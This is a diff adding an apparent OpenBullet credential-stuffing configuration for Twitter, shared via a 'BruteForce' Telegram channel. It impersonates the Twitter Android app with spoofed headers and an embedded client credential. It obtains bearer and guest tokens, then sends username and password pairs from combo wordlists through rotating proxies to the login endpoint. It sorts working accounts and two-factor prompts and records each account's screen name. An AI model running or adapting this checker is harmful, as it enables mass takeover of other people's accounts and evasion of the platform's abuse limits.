@@ -1,0 +1,141 @@
+[SETTINGS]
+{
+  "Name": "Twitter",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-08-24T03:07:33.3709252+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce | API Android | CPM Rate: 200-3000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var g1 = uuidv4();
+END SCRIPT -> VARS "g1"
+
+#P1 REQUEST POST "https://api.twitter.com/oauth2/token" 
+  CONTENT "grant_type=client_credentials" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Cache-Control: no-store" 
+  HEADER "X-B3-TraceId: 0f59c0e3073938c4" 
+  HEADER "OS-Security-Patch-Level: 2017-10-05" 
+  HEADER "X-Twitter-Client-Flavor: " 
+  HEADER "User-Agent: TwitterAndroid/8.95.0-release.00 (28950000-r-0) A5010/7.1.2 (OnePlus;A5010;OnePlus;A5010;0;;1;2013)" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Twitter-Client-AdID: <g1>" 
+  HEADER "Timezone: Asia/Shanghai" 
+  HEADER "X-Twitter-Client-Limit-Ad-Tracking: 0" 
+  HEADER "X-Twitter-Client: TwitterAndroid" 
+  HEADER "X-Twitter-Client-Language: en-US" 
+  HEADER "X-Twitter-Client-DeviceID: 0f59c0e3073938c4" 
+  HEADER "X-Twitter-API-Version: 5" 
+  HEADER "Optimize-Body: true" 
+  HEADER "X-Twitter-Active-User: no" 
+  HEADER "X-Twitter-Client-Version: 8.95.0-release.00" 
+  HEADER "X-Client-UUID: <g1>" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Basic M25WdVNvQlpueDZVNHZ6VXhmNXc6QmNzNTlFRmJic2RGNlNsOU5nNzFzbWdTdFdFR3dYWEtTall2UFZ0N3F5cw==" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Host: api.twitter.com" 
+  HEADER "Connection: keep-alive" 
+
+#TT PARSE "<SOURCE>" JSON "access_token" -> VAR "TT" 
+
+#P2 REQUEST POST "https://api.twitter.com/1.1/guest/activate.json" 
+  CONTENT "" 
+  CONTENTTYPE "text/plain" 
+  HEADER "Cache-Control: no-store" 
+  HEADER "X-B3-TraceId: 0f59c0e3073938c4" 
+  HEADER "OS-Security-Patch-Level: 2017-10-05" 
+  HEADER "X-Twitter-Client-Flavor: " 
+  HEADER "User-Agent: TwitterAndroid/8.95.0-release.00 (28950000-r-0) A5010/7.1.2 (OnePlus;A5010;OnePlus;A5010;0;;1;2013)" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Twitter-Client-AdID: <g1>" 
+  HEADER "Timezone: Asia/Shanghai" 
+  HEADER "X-Twitter-Client-Limit-Ad-Tracking: 0" 
+  HEADER "X-Twitter-Client: TwitterAndroid" 
+  HEADER "X-Twitter-Client-Language: en-US" 
+  HEADER "X-Twitter-Client-DeviceID: 0f59c0e3073938c4" 
+  HEADER "X-Twitter-API-Version: 5" 
+  HEADER "Optimize-Body: true" 
+  HEADER "X-Twitter-Active-User: no" 
+  HEADER "X-Twitter-Client-Version: 8.95.0-release.00" 
+  HEADER "X-Client-UUID: <g1>" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <TT>" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Host: api.twitter.com" 
+  HEADER "Connection: keep-alive" 
+
+#TTT PARSE "<SOURCE>" JSON "guest_token" -> VAR "TTT" 
+
+#P3 REQUEST POST "https://api.twitter.com/auth/1/xauth_password.json" 
+  CONTENT "x_auth_identifier=<USER>&x_auth_password=<PASS>&send_error_codes=true&x_auth_login_challenge=1&x_auth_login_verification=1&ui_metrics=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Cache-Control: no-store" 
+  HEADER "X-B3-TraceId: 0f59c0e3073938c4" 
+  HEADER "OS-Security-Patch-Level: 2017-10-05" 
+  HEADER "X-Twitter-Client-Flavor: " 
+  HEADER "User-Agent: TwitterAndroid/8.95.0-release.00 (28950000-r-0) A5010/7.1.2 (OnePlus;A5010;OnePlus;A5010;0;;1;2013)" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Twitter-Client-AdID: <g1>" 
+  HEADER "Timezone: Asia/Shanghai" 
+  HEADER "X-Twitter-Client-Limit-Ad-Tracking: 0" 
+  HEADER "X-Twitter-Client: TwitterAndroid" 
+  HEADER "X-Twitter-Client-Language: en-US" 
+  HEADER "X-Twitter-Client-DeviceID: 0f59c0e3073938c4" 
+  HEADER "X-Twitter-API-Version: 5" 
+  HEADER "Optimize-Body: true" 
+  HEADER "X-Twitter-Active-User: yes" 
+  HEADER "X-Twitter-Client-Version: 8.95.0-release.00" 
+  HEADER "X-Guest-Token: <TTT>" 
+  HEADER "X-Client-UUID: <g1>" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <TT>" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Host: api.twitter.com" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Could not authenticate you" 
+    KEY "parameter is missing" 
+  KEYCHAIN Success OR 
+    KEY "oauth_token" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "login_verification_request_id" 
+
+#ID PARSE "<SOURCE>" JSON "screen_name" CreateEmpty=FALSE -> CAP "ID" 
+
